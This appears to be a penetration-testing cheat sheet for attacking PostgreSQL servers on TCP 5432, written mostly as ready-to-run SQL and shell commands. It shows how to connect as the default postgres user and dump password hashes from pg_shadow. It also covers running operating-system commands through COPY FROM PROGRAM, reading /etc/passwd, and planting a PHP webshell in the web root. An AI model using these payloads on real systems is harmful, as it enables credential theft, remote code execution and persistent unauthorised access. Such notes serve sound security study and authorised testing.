+++
title = "PostgreSQL: TCP 5432"
+++

`Database > Schema (usually 'public') > Table > Column > Value`

- `TCP 5432`: normal
- Default user: `postgres`
    - Often blocked externally by `pg_hba.conf`
- Server Config:
    - Connection controls: `/etc/postgresql/<version>/main/pg_hba.conf`
    - `/etc/postgresql/<version>/main/postgresql.conf`
- Default system schemas/databases:
    - `postgres` (default database)
    - `pg_catalog` (system metadata, users, roles)
    - `information_schema` (standardized metadata)

```bash
psql -U postgres -h <TARGET_IP> -d postgres -W
```

## Survey

```sql
-- Version and Current User
SELECT version();
SELECT current_user;
SELECT session_user;

-- List Databases (or use \l in psql)
SELECT datname FROM pg_database;

-- List Users and Password Hashes (or use \du)
SELECT usename, passwd FROM pg_shadow; 

-- Check Privileges (Is Superuser?)
SELECT current_setting('is_superuser');

-- Tables and Columns
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
SELECT column_name FROM information_schema.columns WHERE table_name = '<TABLE>';
```

## Command Execution

```sql
-- 1. Create a table to hold command output
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

-- 2. Execute command via PROGRAM and copy output into the table
COPY cmd_exec FROM PROGRAM 'whoami';

-- 3. View the output
SELECT * FROM cmd_exec;
```

## File Read/Write

```sql
-- Read File
CREATE TABLE read_file(line text);
COPY read_file FROM '/etc/passwd';
SELECT * FROM read_file;

-- Write File (Webshell)
COPY (SELECT '<?php system($_REQUEST["cmd"]); ?>') TO '/var/www/html/shell.php';
```
